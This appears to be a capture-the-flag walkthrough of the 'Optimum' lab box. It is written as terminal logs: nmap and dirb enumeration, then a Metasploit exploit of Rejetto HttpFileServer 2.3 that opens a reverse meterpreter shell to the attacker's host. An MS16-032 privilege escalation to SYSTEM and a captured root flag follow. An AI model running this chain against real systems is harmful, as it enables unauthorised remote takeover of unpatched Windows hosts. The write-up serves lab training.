@@ -1,0 +1,266 @@
+---------Optimum Using Metasploit-----------
+
+Enumeration nmap
+
+(kali㉿kali)-[~/Desktop]
+└─$ nmap 10.10.10.8 -A -p-
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 07:27 UTC
+Nmap scan report for 10.10.10.8
+Host is up (0.052s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 127.56 seconds
+
+Website HTTP 80 Enumeration
+                                                                                                                             
+┌──(kali㉿kali)-[~/Desktop]
+└─$ dirb http://10.10.10.8
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Jul 11 07:31:37 2022
+URL_BASE: http://10.10.10.8/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.10.8/ ----
++ http://10.10.10.8/favicon.ico (CODE:200|SIZE:576)                                                                         
+                                                                                                                            
+-----------------
+END_TIME: Mon Jul 11 07:40:32 2022
+DOWNLOADED: 4612 - FOUND: 1
+
+When i visited the website I notcied the server information at the bottom left:
+
+Server information
+HttpFileServer 2.3
+Server time: 17/7/2022 7:45:16 μμ
+Server uptime: 00:19:24 
+
+*After a couple minutes of research I discovered that this version was vulnerable to a remote code execution exploit.
+
+msf6 > search HttpFileServer 2.3
+
+Matching Modules
+================
+
+   #  Name                                   Disclosure Date  Rank       Check  Description
+   -  ----                                   ---------------  ----       -----  -----------
+   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
+
+msf6 > use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/http/rejetto_hfs_exec) > options 
+
+Module options (exploit/windows/http/rejetto_hfs_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               no        Seconds to wait before terminating web server
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-
+                                         Metasploit
+   RPORT      80               yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the l
+                                         ocal machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       The path of the web application
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.74.135   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.10.8
+RHOSTS => 10.10.10.8
+msf6 exploit(windows/http/rejetto_hfs_exec) > set L
+set LHOST                set LISTENERBINDPORT     set LOGLEVEL             
+set LISTENERBINDADDRESS  set LISTENERCOMM         set LPORT                
+msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST tun0
+LHOST => tun0
+msf6 exploit(windows/http/rejetto_hfs_exec) > set LPORT 445
+LPORT => 445
+msf6 exploit(windows/http/rejetto_hfs_exec) > run
+
+[*] Started reverse TCP handler on 10.10.14.2:445 
+[*] Using URL: http://10.10.14.2:8080/40qPglR0b
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Payload request received: /40qPglR0b
+[*] Sending stage (175174 bytes) to 10.10.10.8
+
+ls
+[*] Meterpreter session 1 opened (10.10.14.2:445 -> 10.10.10.8:49162 ) at 2022-07-11 07:49:25 +0000
+[*] Server stopped.
+[!] This exploit may require manual cleanup of '%TEMP%\FwyxB.vbs' on the target
+
+And BOOM! We have our foothold. Now it's time to escalate our privelages. 
+
+ENUMERATION 
+
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.10.8 - Collecting local exploits for x86/windows...
+[*] 10.10.10.8 - 40 exploit checks are being tried...
+[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+
+
+!PRIVELAGE ESCALATION WITH METASPLOIT!
+
+msf6 exploit(windows/local/bypassuac_eventvwr) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options 
+
+Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.74.135   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
+session => 1
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost tun0
+lhost => tun0
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lport 256
+lport => 256
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lport 456
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
+
+[*] Started reverse TCP handler on 10.10.14.2:456 
+[+] Compressed size: 1160
+[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\KpzqbgkiOKmG.ps1...
+[*] Compressing script contents...
+[+] Compressed size: 3731
+[*] Executing exploit script...
+         __ __ ___ ___   ___     ___ ___ ___ 
+        |  V  |  _|_  | |  _|___|   |_  |_  |
+        |     |_  |_| |_| . |___| | |_  |  _|
+        |_|_|_|___|_____|___|   |___|___|___|
+                                            
+                       [by b33f -> @FuzzySec]
+
+[?] Operating system core count: 2
+[>] Duplicating CreateProcessWithLogonW handle
+[?] Done, using thread handle: 2592
+
+[*] Sniffing out privileged impersonation token..
+
+[?] Thread belongs to: svchost
+[+] Thread suspended
+[>] Wiping current impersonation token
+[>] Building SYSTEM impersonation token
+[ref] cannot be applied to a variable that does not exist.
+At line:200 char:3
++         $as = [Ntdll]::NtImpersonateThread($bbT, $bbT, [ref]$ufI)
++         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (ufI:VariablePath) [], Runtime 
+   Exception
+    + FullyQualifiedErrorId : NonExistingVariableReference
+ 
+[!] NtImpersonateThread failed, exiting..
+[+] Thread resumed!
+
+[*] Sniffing out SYSTEM shell..
+
+[>] Duplicating SYSTEM token
+Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateTo
+ken" to type "System.IntPtr": "Cannot convert null to type "System.IntPtr"."
+At line:259 char:2
++     $as = [Advapi32]::DuplicateToken($wLQ, 2, [ref]$pV)
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodException
+    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
+ 
+[>] Starting token race
+[>] Starting process race
+[!] Holy handle leak Batman, we have a SYSTEM shell!!
+
+ebf2mbNMuCWYKvUxkc9KcoGpRjcdGgL4
+[+] Executed on target machine.
+[*] Sending stage (175174 bytes) to 10.10.10.8
+[*] Meterpreter session 2 opened (10.10.14.2:456 -> 10.10.10.8:49163 ) at 2022-07-11 07:59:04 +0000
+[+] Deleted C:\Users\kostas\AppData\Local\Temp\KpzqbgkiOKmG.ps1
+
+meterpreter > whoami
+[-] Unknown command: whoami
+meterpreter > system
+[-] Unknown command: system
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > cd /
+meterpreter > ls
+Listing: C:\
+============
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+040777/rwxrwxrwx  0       dir   2017-03-18 11:57:16 +0000  $Recycle.Bin
+100666/rw-rw-rw-  1       fil   2013-06-18 12:18:29 +0000  BOOTNXT
+040777/rwxrwxrwx  0       dir   2013-08-22 14:48:41 +0000  Documents and Settings
+040777/rwxrwxrwx  0       dir   2013-08-22 15:52:33 +0000  PerfLogs
+040555/r-xr-xr-x  4096    dir   2017-12-31 04:14:26 +0000  Program Files
+040777/rwxrwxrwx  4096    dir   2022-07-17 16:57:13 +0000  Program Files (x86)
+040777/rwxrwxrwx  4096    dir   2017-12-31 04:14:26 +0000  ProgramData
+040777/rwxrwxrwx  0       dir   2017-03-18 09:50:05 +0000  System Volume Information
+040555/r-xr-xr-x  4096    dir   2017-03-18 11:57:09 +0000  Users
+040777/rwxrwxrwx  24576   dir   2017-03-18 11:53:41 +0000  Windows
+100444/r--r--r--  404250  fil   2014-11-22 01:45:46 +0000  bootmgr
+000000/---------  0       fif   1970-01-01 00:00:00 +0000  pagefile.sys
+
+meterpreter > cd Users\\
+meterpreter > cd Administrator\\
+meterpreter > cd Desktop\\
+meterpreter > cat root.txt
+51ed1b36553c8461f4552c2e92b3eeed
+
+PWNED
